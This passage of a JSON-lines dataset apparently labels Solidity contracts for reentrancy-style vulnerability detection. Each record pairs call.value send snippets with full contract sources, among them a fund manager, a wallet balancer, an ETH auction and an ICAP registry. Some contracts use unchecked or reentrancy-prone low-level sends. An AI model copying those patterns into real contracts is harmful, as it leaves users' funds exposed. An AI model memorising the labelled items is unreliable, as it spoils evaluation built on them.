isContract(address addr) internal view returns (bool) { uint256 size; assembly { size := extcodesize(addr) } return size > 0; } } contract UpgradeabilityProxy is Proxy { event Upgraded(address implementation); bytes32 private constant IMPLEMENTATION_SLOT = 0x7050c9e0f4ca769c69bd3a8ef740bc37934f8e2c036e5a723fd8ee048ed3f8c3; constructor(address _implementation) public { assert(IMPLEMENTATION_SLOT == keccak256(\"org.zeppelinos.proxy.implementation\")); _setImplementation(_implementation); } function _implementation() internal view returns (address impl) { bytes32 slot = IMPLEMENTATION_SLOT; assembly { impl := sload(slot) } } function _upgradeTo(address newImplementation) internal { _setImplementation(newImplementation); emit Upgraded(newImplementation); } function _setImplementation(address newImplementation) private { require(AddressUtils.isContract(newImplementation), \"Cannot set a proxy implementation to a non-contract address\"); bytes32 slot = IMPLEMENTATION_SLOT; assembly { sstore(slot, newImplementation) } } } contract AdminUpgradeabilityProxy is UpgradeabilityProxy { event AdminChanged(address previousAdmin, address newAdmin); bytes32 private constant ADMIN_SLOT = 0x10d6a54a4754c8869d6886b5f5d7fbfa5b4522237ea5c60d11bc4e7a1ff9390b; modifier ifAdmin() { if (msg.sender == _admin()) { _; } else { _fallback(); } } constructor(address _implementation) UpgradeabilityProxy(_implementation) public { assert(ADMIN_SLOT == keccak256(\"org.zeppelinos.proxy.admin\")); _setAdmin(msg.sender); } function admin() external view ifAdmin returns (address) { return _admin(); } function implementation() external view ifAdmin returns (address) { return _implementation(); } function changeAdmin(address newAdmin) external ifAdmin { require(newAdmin != address(0), \"Cannot change the admin of a proxy to the zero address\"); emit AdminChanged(_admin(), newAdmin); _setAdmin(newAdmin); } function upgradeTo(address newImplementation) external ifAdmin { _upgradeTo(newImplementation); } function upgradeToAndCall(address newImplementation, bytes data) payable external ifAdmin { _upgradeTo(newImplementation); require(address(this).call.value(msg.value)(data)); } function _admin() internal view returns (address adm) { bytes32 slot = ADMIN_SLOT; assembly { adm := sload(slot) } } function _setAdmin(address newAdmin) internal { bytes32 slot = ADMIN_SLOT; assembly { sstore(slot, newAdmin) } } function _willFallback() internal { require(msg.sender != _admin(), \"Cannot call fallback function from the proxy admin\"); super._willFallback(); } } pragma solidity ^0.4.24; contract FiatTokenProxy is AdminUpgradeabilityProxy { constructor(address _implementation) public AdminUpgradeabilityProxy(_implementation) { } } "}
{"sol name": "39269.sol", "label": 0, "first path": "function sendPending() public preventReentry isHolder(msg.sender) returns (bool){ if (ptxTail == ptxHead) return false; TX memory tx = pendingTxs[ptxTail]; if(now < tx.timeLock) return false; delete pendingTxs[ptxTail++]; if(!tx.blocked) { if(tx.to.call.value(tx.value)(tx.data)) { committedEther -= tx.value; Withdrawal(tx.from, tx.to, tx.value); return true; if (tx.from == address(this)) { committedEther -= tx.value; } else { holders[tx.from].etherBalance += tx.value; TransactionFailed(tx.from, tx.to, tx.value); return false; ", "second path": "function sendPending() public preventReentry isHolder(msg.sender) returns (bool){ if (ptxTail == ptxHead) return false; TX memory tx = pendingTxs[ptxTail]; if(now < tx.timeLock) return false; delete pendingTxs[ptxTail++]; if(!tx.blocked) { if(tx.to.call.value(tx.value)(tx.data)) { committedEther -= tx.value; Withdrawal(tx.from, tx.to, tx.value); return true; if (tx.from == address(this)) { committedEther -= tx.value; } else { holders[tx.from].etherBalance += tx.value; TransactionFailed(tx.from, tx.to, tx.value); return false; ", "third path": "function sendPending() public preventReentry isHolder(msg.sender) returns (bool){ if (ptxTail == ptxHead) return false; TX memory tx = pendingTxs[ptxTail]; if(now < tx.timeLock) return false; delete pendingTxs[ptxTail++]; if(!tx.blocked) { if(tx.to.call.value(tx.value)(tx.data)) { committedEther -= tx.value; Withdrawal(tx.from, tx.to, tx.value); return true; if (tx.from == address(this)) { committedEther -= tx.value; } else { holders[tx.from].etherBalance += tx.value; TransactionFailed(tx.from, tx.to, tx.value); return false; ", "long path": "pragma solidity ^0.4.10; contract RegBase { bytes32 constant public VERSION = \"RegBase v0.2.1\"; bytes32 public regName; bytes32 public resource; address public owner; event ChangedOwner(address indexed oldOwner, address indexed newOwner); event ChangedResource(bytes32 indexed resource); modifier onlyOwner() { require(msg.sender == owner); _; } function RegBase(address _creator, bytes32 _regName, address _owner) { regName = _regName; owner = _owner != 0x0 ? _owner : _creator != 0x0 ? _creator : msg.sender; } function destroy() public onlyOwner { selfdestruct(msg.sender); } function changeOwner(address _owner) public onlyOwner returns (bool) { ChangedOwner(owner, _owner); owner = _owner; return true; } function changeResource(bytes32 _resource) public onlyOwner returns (bool) { resource = _resource; ChangedResource(_resource); return true; } } pragma solidity ^0.4.10; contract Factory is RegBase { uint public value; event Created(address _creator, bytes32 _regName, address _address); modifier feePaid() { require(msg.value == value || msg.sender == owner); _; } function Factory(address _creator, bytes32 _regName, address _owner) RegBase(_creator, _regName, _owner) { } function set(uint _fee) onlyOwner returns (bool) { value = _fee; return true; } function withdraw() public returns (bool) { owner.transfer(this.balance); return true; } function createNew(bytes32 _regName, address _owner) payable returns(address kAddr_); } pragma solidity ^0.4.10; contract BaktInterface { struct Holder { uint8 id; address votingFor; uint40 offerExpiry; uint lastClaimed; uint tokenBalance; uint etherBalance; uint votes; uint offerAmount; mapping (address => uint) allowances; } struct TX { bool blocked; uint40 timeLock; address from; address to; uint value; bytes data; } uint constant MAXTOKENS = 2**128 - 10**18; uint constant MAXETHER = 2**128; uint constant BLOCKPCNT = 10; uint constant TOKENPRICE = 1000000000000000; uint8 public constant decimalPlaces = 15; bool __reMutex; bool __initFuse = true; bool public acceptingPayments; uint40 public PANICPERIOD; uint40 public TXDELAY; bool public panicked; uint8 public ptxHead; uint8 public ptxTail; uint40 public timeToCalm; address public trustee; uint public totalSupply; uint public committedEther; uint dividendPoints; uint public totalDividends; bytes32 public regName; bytes32 public resource; mapping (address => Holder) public holders; address[256] public holderIndex; TX[256] public pendingTxs; event Deposit(uint value); event Withdrawal(address indexed sender, address indexed recipient, uint value); event TransactionPending(uint indexed pTX, address indexed sender, address indexed recipient, uint value, uint timeLock); event TransactionBlocked(address indexed by, uint indexed pTX); event TransactionFailed(address indexed sender, address indexed recipient, uint value); event DividendPaid(uint value); event Transfer(address indexed from, address indexed to, uint value); event Approval(address indexed owner, address indexed spender, uint value); event Trustee(address indexed trustee); event NewHolder(address indexed holder); event HolderVacated(address indexed holder); event IssueOffer(address indexed holder); event TokensCreated(address indexed holder, uint amount); event TokensDestroyed(address indexed holder, uint amount); event Panicked(address indexed by); event Calm(); function() payable; function _init(uint40 _panicDelayInSeconds, uint40 _pendingDelayInSeconds) returns (bool); function fundBalance() constant returns (uint); function tokenPrice() constant returns (uint); function balanceOf(address _addr) constant returns (uint); function transfer(address _to, uint _amount) returns (bool); function transferFrom(address _from, address _to, uint256 _amount) returns (bool); function approve(address _spender, uint256 _amount) returns (bool); function allowance(address _owner, address _spender) constant returns (uint256); function PANIC() returns (bool); function calm() returns (bool); function sendPending() returns (bool); function blockPendingTx(uint _txIdx) returns (bool); function execute(address _to, uint _value, bytes _data) returns (uint8); function payDividends(uint _value) returns (bool); function getHolders() constant returns(address[256]); function etherBalanceOf(address _addr) constant returns (uint); function withdraw() returns(uint8); function vacate(address _addr) returns (bool); function purchase() payable returns (bool); function redeem(uint _amount) returns (bool); function vote(address _candidate) returns (bool); } contract Bakt is BaktInterface { bytes32 constant public VERSION = \"Bakt 0.3.4-beta\"; function Bakt(address _creator, bytes32 _regName, address _trustee) { regName = _regName; trustee = _trustee != 0x0 ? _trustee : _creator != 0x0 ? _creator : msg.sender; join(trustee); } function() payable { require(msg.value > 0 && msg.value + this.balance < MAXETHER && acceptingPayments); Deposit(msg.value); } function destroy() public canEnter onlyTrustee { require(totalSupply == 0 && committedEther == 0); delete holders[trustee]; selfdestruct(msg.sender); } function _init(uint40 _panicPeriodInSeconds, uint40 _pendingPeriodInSeconds) onlyTrustee returns (bool) { require(__initFuse); PANICPERIOD = _panicPeriodInSeconds; TXDELAY = _pendingPeriodInSeconds; acceptingPayments = true; delete __initFuse; return true; } function fundBalance() public constant returns (uint) { return this.balance - committedEther; } function tokenPrice() public constant returns (uint) { return TOKENPRICE; } function changeResource(bytes32 _resource) public canEnter onlyTrustee returns (bool) { resource = _resource; return true; } function balanceOf(address _addr) public constant returns (uint) { return holders[_addr].tokenBalance; } function transfer(address _to, uint _amount) public canEnter isHolder(_to) returns (bool) { Holder from = holders[msg.sender]; Holder to = holders[_to]; Transfer(msg.sender, _to, _amount); return xfer(from, to, _amount); } function transferFrom(address _from, address _to, uint256 _amount) public canEnter isHolder(_to) returns (bool) { require(_amount <= holders[_from].allowances[msg.sender]); Holder from = holders[_from]; Holder to = holders[_to]; from.allowances[msg.sender] -= _amount; Transfer(_from, _to, _amount); return xfer(from, to, _amount); } function approve(address _spender, uint256 _amount) public canEnter returns (bool) { holders[msg.sender].allowances[_spender] = _amount; Approval(msg.sender, _spender, _amount); return true; } function allowance(address _owner, address _spender) constant returns (uint256) { return holders[_owner].allowances[_spender]; } function xfer(Holder storage _from, Holder storage _to, uint _amount) internal returns (bool) { updateDividendsFor(_from); updateDividendsFor(_to); revoke(_from); revoke(_to); _from.tokenBalance -= _amount; _to.tokenBalance += _amount; revote(_from); revote(_to); election(); return true; } function PANIC() public isHolder(msg.sender) returns (bool) { require(holders[msg.sender].tokenBalance >= totalSupply / 10); panicked = true; timeToCalm = uint40(now + PANICPERIOD); Panicked(msg.sender); return true; } function calm() public isHolder(msg.sender) returns (bool) { require(uint40(now) > timeToCalm && panicked); panicked = false; Calm(); return true; } function timeLockSend(address _from, address _to, uint _value, bytes _data) internal returns (uint8) { require(ptxHead + 1 != ptxTail); TX memory tx = TX({ from: _from, to: _to, value: _value, data: _data, blocked: false, timeLock: uint40(now + TXDELAY) }); TransactionPending(ptxHead, _from, _to, _value, now + TXDELAY); pendingTxs[ptxHead++] = tx; return  ptxHead - 1; } function sendPending() public preventReentry isHolder(msg.sender) returns (bool){ if (ptxTail == ptxHead) return false; TX memory tx = pendingTxs[ptxTail]; if(now < tx.timeLock) return false; delete pendingTxs[ptxTail++]; if(!tx.blocked) { if(tx.to.call.value(tx.value)(tx.data)) { committedEther -= tx.value; Withdrawal(tx.from, tx.to, tx.value); return true; } } if (tx.from == address(this)) { committedEther -= tx.value; } else { holders[tx.from].etherBalance += tx.value; } TransactionFailed(tx.from, tx.to, tx.value); return false; } function blockPendingTx(uint _txIdx) public returns (bool) { require(!__reMutex); require(holders[msg.sender].tokenBalance >= totalSupply / BLOCKPCNT || msg.sender == pendingTxs[ptxTail].from || msg.sender == trustee); pendingTxs[_txIdx].blocked = true; TransactionBlocked(msg.sender, _txIdx); return true; } function execute(address _to, uint _value, bytes _data) public canEnter onlyTrustee returns (uint8) { require(_value <= fundBalance()); committedEther += _value; return timeLockSend(address(this), _to, _value, _data); } function payDividends(uint _value) public canEnter onlyTrustee returns (bool) { require(_value <= fundBalance()); dividendPoints += 10**18 * _value / totalSupply; totalDividends += _value; committedEther += _value; return true; } function addHolder(address _addr) public canEnter onlyTrustee returns (bool) { return join(_addr); } function join(address _addr) internal returns (bool) { if(0 != holders[_addr].id) return true; require(_addr != address(this)); uint8 id; while (holderIndex[++id] != 0) {} if(id == 0) revert(); Holder holder = holders[_addr]; holder.id = id; holder.lastClaimed = dividendPoints; holder.votingFor = trustee; holderIndex[id] = _addr; NewHolder(_addr); return true; } function acceptPayments(bool _accepting) public canEnter onlyTrustee returns (bool) { acceptingPayments = _accepting; return true; } function issue(address _addr, uint _amount) public canEnter onlyTrustee returns (bool) { assert(totalSupply + _amount < MAXTOKENS); join(_addr); Holder holder = holders[_addr]; holder.offerAmount = _amount; holder.offerExpiry = uint40(now + 7 days); IssueOffer(_addr); return true; } function revokeOffer(address _addr) public canEnter onlyTrustee returns (bool) { Holder holder = holders[_addr]; delete holder.offerAmount; delete holder.offerExpiry; return true; } function getHolders() public constant returns(address[256]) { return holderIndex; } function etherBalanceOf(address _addr) public constant returns (uint) { Holder holder = holders[_addr]; return holder.etherBalance + dividendsOwing(holder); } function withdraw() public canEnter returns(uint8 pTxId_) { Holder holder = holders[msg.sender]; updateDividendsFor(holder); pTxId_ = timeLockSend(msg.sender, msg.sender, holder.etherBalance, \"\"); holder.etherBalance = 0; } function vacate(address _addr) public canEnter isHolder(msg.sender) isHolder(_addr) returns (bool) { Holder holder = holders[_addr]; require(_addr != trustee); require(holder.tokenBalance == 0); require(holder.etherBalance == 0); require(holder.lastClaimed == dividendPoints); require(ptxHead == ptxTail); delete holderIndex[holder.id]; delete holders[_addr]; return (true); } function purchase() payable canEnter returns (bool) { Holder holder = holders[msg.sender]; require(holder.offerAmount > 0); require(holder.offerExpiry > now); require(msg.value == holder.offerAmount * TOKENPRICE); updateDividendsFor(holder); revoke(holder); totalSupply += holder.offerAmount; holder.tokenBalance += holder.offerAmount; TokensCreated(msg.sender, holder.offerAmount); delete holder.offerAmount; delete holder.offerExpiry; revote(holder); election(); return true; } function redeem(uint _amount) public canEnter isHolder(msg.sender) returns (bool) { uint redeemPrice; uint eth; Holder holder = holders[msg.sender]; require(_amount <= holder.tokenBalance); updateDividendsFor(holder); revoke(holder); redeemPrice = fundBalance() / totalSupply; redeemPrice = redeemPrice < TOKENPRICE ? redeemPrice : TOKENPRICE; eth = _amount * redeemPrice; require(eth > 0); totalSupply -= _amount; holder.tokenBalance -= _amount; holder.etherBalance += eth; committedEther += eth; TokensDestroyed(msg.sender, _amount); revote(holder); election(); return true; } function dividendsOwing(Holder storage _holder) internal constant returns (uint _value) { return (dividendPoints - _holder.lastClaimed) * _holder.tokenBalance/ 10**18; } function updateDividendsFor(Holder storage _holder) internal { _holder.etherBalance += dividendsOwing(_holder); _holder.lastClaimed = dividendPoints; } function vote(address _candidate) public isHolder(msg.sender) isHolder(_candidate) returns (bool) { require(!__reMutex); Holder holder = holders[msg.sender]; revoke(holder); holder.votingFor = _candidate; revote(holder); election(); return true; } function election() internal { uint max; uint winner; uint votes; uint8 i; address addr; if (0 == totalSupply) return; while(++i != 0) { addr = holderIndex[i]; if (addr != 0x0) { votes = holders[addr].votes; if (votes > max) { max = votes; winner = i; } } } trustee = holderIndex[winner]; Trustee(trustee); } function revoke(Holder _holder) internal { holders[_holder.votingFor].votes -= _holder.tokenBalance; } function revote(Holder _holder) internal { holders[_holder.votingFor].votes += _holder.tokenBalance; } modifier preventReentry() { require(!(__reMutex || panicked || __initFuse)); __reMutex = true; _; __reMutex = false; return; } modifier canEnter() { require(!(__reMutex || panicked || __initFuse)); _; } modifier isHolder(address _addr) { require(0 != holders[_addr].id); _; } modifier onlyTrustee() { require(msg.sender == trustee); _; } } contract BaktFactory is Factory { bytes32 constant public regName = \"Bakt\"; bytes32 constant public VERSION = \"Bakt Factory v0.3.4-beta\"; function BaktFactory(address _creator, bytes32 _regName, address _owner) Factory(_creator, _regName, _owner) { } function createNew(bytes32 _regName, address _owner) payable feePaid returns (address kAddr_) { require(_regName != 0x0); kAddr_ = new Bakt(owner, _regName, msg.sender); Created(msg.sender, _regName, kAddr_); } } "}
{"sol name": "10604.sol", "label": 0, "first path": "function executeTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) { return to.call.value(value)(data); ", "second path": "function executeTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) { return to.call.value(value)(data); ", "third path": "function executeTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) { return to.call.value(value)(data); ", "long path": "contract Ownable { address public owner; modifier onlyOwner() { require(msg.sender == owner); _; } constructor() public { owner = msg.sender; } function setOwner(address _owner) public onlyOwner returns (bool) { require(_owner != address(0)); owner = _owner; return true; } } contract RpSafeMath { function safeAdd(uint256 x, uint256 y) internal returns(uint256) { uint256 z = x + y; assert((z >= x) && (z >= y)); return z; } function safeSubtract(uint256 x, uint256 y) internal returns(uint256) { assert(x >= y); uint256 z = x - y; return z; } function safeMult(uint256 x, uint256 y) internal returns(uint256) { uint256 z = x * y; assert((x == 0)||(z/x == y)); return z; } function min(uint256 a, uint256 b) internal returns(uint256) { if (a < b) { return a; } else { return b; } } function max(uint256 a, uint256 b) internal returns(uint256) { if (a > b) { return a; } else { return b; } } } contract HasWorkers is Ownable { mapping(address => uint256) private workerToIndex; address[] private workers; event AddedWorker(address _worker); event RemovedWorker(address _worker); constructor() public { workers.length++; } modifier onlyWorker() { require(isWorker(msg.sender)); _; } modifier workerOrOwner() { require(isWorker(msg.sender) || msg.sender == owner); _; } function isWorker(address _worker) public view returns (bool) { return workerToIndex[_worker] != 0; } function allWorkers() public view returns (address[] memory result) { result = new address[](workers.length - 1); for (uint256 i = 1; i < workers.length; i++) { result[i - 1] = workers[i]; } } function addWorker(address _worker) public onlyOwner returns (bool) { require(!isWorker(_worker)); uint256 index = workers.push(_worker) - 1; workerToIndex[_worker] = index; emit AddedWorker(_worker); return true; } function removeWorker(address _worker) public onlyOwner returns (bool) { require(isWorker(_worker)); uint256 index = workerToIndex[_worker]; address lastWorker = workers[workers.length - 1]; workerToIndex[lastWorker] = index; workers[index] = lastWorker; workers.length--; delete workerToIndex[_worker]; emit RemovedWorker(_worker); return true; } } contract Token { function transfer(address _to, uint _value) returns (bool success); function transferFrom(address _from, address _to, uint256 _value) returns (bool success); function allowance(address _owner, address _spender) constant returns (uint256 remaining); function approve(address _spender, uint256 _value) returns (bool success); function increaseApproval (address _spender, uint _addedValue) public returns (bool success); function balanceOf(address tokenOwner) public constant returns (uint balance); } contract Balancer is RpSafeMath, Ownable, HasWorkers { address[] public accounts; address public coldWallet; uint256 public limitEth; mapping(address => uint256) public limitToken; bool public paused; constructor() public { coldWallet = msg.sender; } function allAccounts() public view returns (address[]) { return accounts; } function pause() public workerOrOwner returns (bool) { paused = true; return true; } function unpause() public onlyOwner returns (bool) { paused = false; return true; } function setLimitEth(uint256 limit) public onlyOwner returns (bool) { limitEth = limit; return true; } function setLimitToken(Token token, uint256 limit) public onlyOwner returns (bool) { limitToken[token] = limit; return true; } function addAccount(address account) public onlyOwner returns (bool) { accounts.push(account); return true; } function removeAccountSearch(address account) public onlyOwner returns (bool) { for(uint256 index = 0; index < accounts.length; index++) { if (accounts[index] == account) { return removeAccount(index, account); } } revert(); } function removeAccount(uint256 index, address account) public onlyOwner returns (bool) { require(accounts[index] == account); accounts[index] = accounts[accounts.length - 1]; accounts.length -= 1; return true; } function setColdWallet(address wallet) public onlyOwner returns (bool) { coldWallet = wallet; return true; } function executeTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) { return to.call.value(value)(data); } function loadEthBalances() public view returns (uint256[] memory, uint256 total) { uint256[] memory result = new uint256[](accounts.length); uint256 balance; for (uint256 i = 0; i < accounts.length; i++) { balance = accounts[i].balance; result[i] = balance; total += balance; } return (result, total); } function loadTokenBalances(Token token) public view returns (uint256[] memory, uint256 total) { uint256[] memory result = new uint256[](accounts.length); uint256 balance; for (uint256 i = 0; i < accounts.length; i++) { balance = token.balanceOf(accounts[i]); result[i] = balance; total += balance; } return (result, total); } function getTargetPerWallet(uint256 target, uint256[] memory balances) internal pure returns (uint256 nTarget) { uint256 d = balances.length; uint256 oTarget = target / balances.length; uint256 t; for (uint256 i = 0; i < balances.length; i++) { if (balances[i] > oTarget) { d--; t += (balances[i] - oTarget); } } nTarget = oTarget - (t / d); } function() public payable { if (gasleft() > 2400) { if (paused) { coldWallet.transfer(address(this).balance); } else { uint256[] memory balances; uint256 total; (balances, total) = loadEthBalances(); uint256 value = address(this).balance; uint256 targetTotal = min(limitEth, total + value); if (targetTotal > total) { uint256 targetPerHotwallet = getTargetPerWallet(targetTotal, balances); for (uint256 i = 0; i < balances.length; i++) { if (balances[i] < targetPerHotwallet) { accounts[i].transfer(targetPerHotwallet - balances[i]); } } } uint256 toColdWallet = address(this).balance; if (toColdWallet != 0) { coldWallet.transfer(toColdWallet); } } } } function handleTokens(Token token) public returns (bool) { if (paused) { token.transfer(coldWallet, token.balanceOf(this)); } else { uint256[] memory balances; uint256 total; (balances, total) = loadTokenBalances(token); uint256 value = token.balanceOf(address(this)); uint256 targetTotal = min(limitToken[token], total + value); if (targetTotal > total) { uint256 targetPerHotwallet = getTargetPerWallet(targetTotal, balances); for (uint256 i = 0; i < balances.length; i++) { if (balances[i] < targetPerHotwallet) { token.transfer(accounts[i], targetPerHotwallet - balances[i]); } } } uint256 toColdWallet = token.balanceOf(address(this)); if (toColdWallet != 0) { token.transfer(coldWallet, toColdWallet); } } } } "}
{"sol name": "26188.sol", "label": 0, "first path": "function GetPrizeFund() public payable { require(now>EndTime); require(Bids[msg.sender]>=MaxOffer); uint prizeAmount = Bids[msg.sender]+PrizeFund; PrizeFund = 0; Bids[msg.sender]=0; msg.sender.call.value(prizeAmount); function RevokeBid() public payable { require(now>EndTime); uint toTransfer = Bids[msg.sender]; Bids[msg.sender]=0; msg.sender.call.value(toTransfer); ", "second path": "function GetPrizeFund() public payable { require(now>EndTime); require(Bids[msg.sender]>=MaxOffer); uint prizeAmount = Bids[msg.sender]+PrizeFund; PrizeFund = 0; Bids[msg.sender]=0; msg.sender.call.value(prizeAmount); function RevokeBid() public payable { require(now>EndTime); uint toTransfer = Bids[msg.sender]; Bids[msg.sender]=0; msg.sender.call.value(toTransfer); ", "third path": "function GetPrizeFund() public payable { require(now>EndTime); require(Bids[msg.sender]>=MaxOffer); uint prizeAmount = Bids[msg.sender]+PrizeFund; PrizeFund = 0; Bids[msg.sender]=0; msg.sender.call.value(prizeAmount); function RevokeBid() public payable { require(now>EndTime); uint toTransfer = Bids[msg.sender]; Bids[msg.sender]=0; msg.sender.call.value(toTransfer); ", "long path": "pragma solidity ^0.4.19; contract EXPERIMENTAL_ETH_AUCTION { uint public PrizeFund; uint public MaxOffer = 0; uint public EndTime= now + 14 days; uint public SelfDestructTime = now + 16 days; mapping(address=>uint) public Bids; address creator = msg.sender; function ContributionToPrizeFund() public payable { PrizeFund+=msg.value; } function() public payable { if(msg.value>0) { ContributionToPrizeFund(); } } function SendBid() public payable { require(now<EndTime); Bids[msg.sender]+=msg.value; if(Bids[msg.sender]>MaxOffer) { MaxOffer=Bids[msg.sender]; } } function GetPrizeFund() public payable { require(now>EndTime); require(Bids[msg.sender]>=MaxOffer); uint prizeAmount = Bids[msg.sender]+PrizeFund; PrizeFund = 0; Bids[msg.sender]=0; msg.sender.call.value(prizeAmount); } function RevokeBid() public payable { require(now>EndTime); uint toTransfer = Bids[msg.sender]; Bids[msg.sender]=0; msg.sender.call.value(toTransfer); } function kill() public { require(msg.sender==creator); require(now>SelfDestructTime); selfdestruct(msg.sender); } } "}
{"sol name": "2021.sol", "label": 0, "first path": "function _unsafeSend(address _to, uint _value) internal returns(bool) { return _to.call.value(_value)(); function _safeSend(address _to, uint _value) internal { if (!_unsafeSend(_to, _value)) { throw; ", "second path": "function _unsafeSend(address _to, uint _value) internal returns(bool) { return _to.call.value(_value)(); function _safeSend(address _to, uint _value) internal { if (!_unsafeSend(_to, _value)) { throw; ", "third path": "function _unsafeSend(address _to, uint _value) internal returns(bool) { return _to.call.value(_value)(); function _safeSend(address _to, uint _value) internal { if (!_unsafeSend(_to, _value)) { throw; ", "long path": "contract Ambi { function getNodeAddress(bytes32 _nodeName) constant returns(address); function hasRelation(bytes32 _nodeName, bytes32 _relation, address _to) constant returns(bool); function addNode(bytes32 _nodeName, address _nodeAddress) constant returns(bool); } contract AmbiEnabled { Ambi public ambiC; bool public isImmortal; bytes32 public name; modifier checkAccess(bytes32 _role) { if(address(ambiC) != 0x0 && ambiC.hasRelation(name, _role, msg.sender)){ _; } } function getAddress(bytes32 _name) constant returns (address) { return ambiC.getNodeAddress(_name); } function setAmbiAddress(address _ambi, bytes32 _name) returns (bool){ if(address(ambiC) != 0x0){ return false; } Ambi ambiContract = Ambi(_ambi); if(ambiContract.getNodeAddress(_name)!=address(this)) { if (!ambiContract.addNode(_name, address(this))){ return false; } } name = _name; ambiC = ambiContract; return true; } function immortality() checkAccess(\"owner\") returns(bool) { isImmortal = true; return true; } function remove() checkAccess(\"owner\") returns(bool) { if (isImmortal) { return false; } selfdestruct(msg.sender); return true; } } library StackDepthLib { uint constant GAS_PER_DEPTH = 400; function checkDepth(address self, uint n) constant returns(bool) { if (n == 0) return true; return self.call.gas(GAS_PER_DEPTH * n)(0x21835af6, n - 1); } function __dig(uint n) constant { if (n == 0) return; if (!address(this).delegatecall(0x21835af6, n - 1)) throw; } } contract Safe { modifier noValue { if (msg.value > 0) { _safeSend(msg.sender, msg.value); } _; } modifier onlyHuman { if (_isHuman()) { _; } } modifier noCallback { if (!isCall) { _; } } modifier immutable(address _address) { if (_address == 0) { _; } } address stackDepthLib; function setupStackDepthLib(address _stackDepthLib) immutable(address(stackDepthLib)) returns(bool) { stackDepthLib = _stackDepthLib; return true; } modifier requireStackDepth(uint16 _depth) { if (stackDepthLib == 0x0) { throw; } if (_depth > 1023) { throw; } if (!stackDepthLib.delegatecall(0x32921690, stackDepthLib, _depth)) { throw; } _; } function _safeFalse() internal noValue() returns(bool) { return false; } function _safeSend(address _to, uint _value) internal { if (!_unsafeSend(_to, _value)) { throw; } } function _unsafeSend(address _to, uint _value) internal returns(bool) { return _to.call.value(_value)(); } function _isContract() constant internal returns(bool) { return msg.sender != tx.origin; } function _isHuman() constant internal returns(bool) { return !_isContract(); } bool private isCall = false; function _setupNoCallback() internal { isCall = true; } function _finishNoCallback() internal { isCall = false; } } contract RegistryICAP is AmbiEnabled, Safe { function decodeIndirect(bytes _bban) constant returns(string, string, string) { bytes memory asset = new bytes(3); bytes memory institution = new bytes(4); bytes memory client = new bytes(9); uint8 k = 0; for (uint8 i = 0; i < asset.length; i++) { asset[i] = _bban[k++]; } for (i = 0; i < institution.length; i++) { institution[i] = _bban[k++]; } for (i = 0; i < client.length; i++) { client[i] = _bban[k++]; } return (string(asset), string(institution), string(client)); } function parse(bytes32 _icap) constant returns(address, bytes32, bool) { if (_icap[0] != 88 || _icap[1] != 69) { return (0, 0, false); } for (uint8 j = 20; j < 32; j++) { if (_icap[j] != 0) { return (0, 0, false); } } bytes memory bban = new bytes(18); for (uint8 i = 0; i < 16; i++) { bban[i] = _icap[i + 4]; } var (asset, institution, _) = decodeIndirect(bban); bytes32 assetInstitutionHash = sha3(asset, institution); uint8 parseChecksum = (uint8(_icap[2]) - 48) * 10 + (uint8(_icap[3]) - 48); uint8 calcChecksum = 98 - mod9710(prepare(bban)); if (parseChecksum != calcChecksum) { return (institutions[assetInstitutionHash], assets[sha3(asset)], false); } return (institutions[assetInstitutionHash], assets[sha3(asset)], registered[assetInstitutionHash]); } function prepare(bytes _bban) constant returns(bytes) { for (uint8 i = 0; i < 16; i++) { uint8 charCode = uint8(_bban[i]); if (charCode >= 65 && charCode <= 90) { _bban[i] = byte(charCode - 65 + 10); } } _bban[16] = 33; _bban[17] = 14; return _bban; } function mod9710(bytes _prepared) constant returns(uint8) { uint m = 0; for (uint8 i = 0; i < 18; i++) { uint8 charCode = uint8(_prepared[i]); if (charCode >= 48) { m *= 10; m += charCode - 48; m %= 97; } else { m *= 10; m += charCode / 10; m %= 97; m *= 10; m += charCode % 10; m %= 97; } } m *= 10; m %= 97; m *= 10; m %= 97; return uint8(m); } mapping(bytes32 => bool) public registered; mapping(bytes32 => address) public institutions; mapping(bytes32 => address) public institutionOwners; mapping(bytes32 => bytes32) public assets; modifier onlyInstitutionOwner(string _institution) { if (msg.sender == institutionOwners[sha3(_institution)]) { _; } } function changeInstitutionOwner(string _institution, address _address) noValue() onlyInstitutionOwner(_institution) returns(bool) { institutionOwners[sha3(_institution)] = _address; return true; } function addr(bytes32 _institution) constant returns(address) { return institutions[sha3(\"ETH\", _institution[0], _institution[1], _institution[2], _institution[3])]; } function registerInstitution(string _institution, address _address) noValue() checkAccess(\"admin\") returns(bool) { if (bytes(_institution).length != 4) { return false; } if (institutionOwners[sha3(_institution)] != 0) { return false; } institutionOwners[sha3(_institution)] = _address; return true; } function registerInstitutionAsset(string _asset, string _institution, address _address) noValue() onlyInstitutionOwner(_institution) returns(bool) { if (!registered[sha3(_asset)]) { return false; } bytes32 assetInstitutionHash = sha3(_asset, _institution); if (registered[assetInstitutionHash]) { return false; } registered[assetInstitutionHash] = true; institutions[assetInstitutionHash] = _address; return true; } function updateInstitutionAsset(string _asset, string _institution, address _address) noValue() onlyInstitutionOwner(_institution) returns(bool) { bytes32 assetInstitutionHash = sha3(_asset, _institution); if (!registered[assetInstitutionHash]) { return false; } institutions[assetInstitutionHash] = _address; return true; } function removeInstitutionAsset(string _asset, string _institution) noValue() onlyInstitutionOwner(_institution) returns(bool) { bytes32 assetInstitutionHash = sha3(_asset, _institution); if (!registered[assetInstitutionHash]) { return false; } delete registered[assetInstitutionHash]; delete institutions[assetInstitutionHash]; return true; } function registerAsset(string _asset, bytes32 _symbol) noValue() checkAccess(\"admin\") returns(bool) { if (bytes(_asset).length != 3) { return false; } bytes32 asset = sha3(_asset); if (registered[asset]) { return false; } registered[asset] = true; assets[asset] = _symbol; return true; } } "}
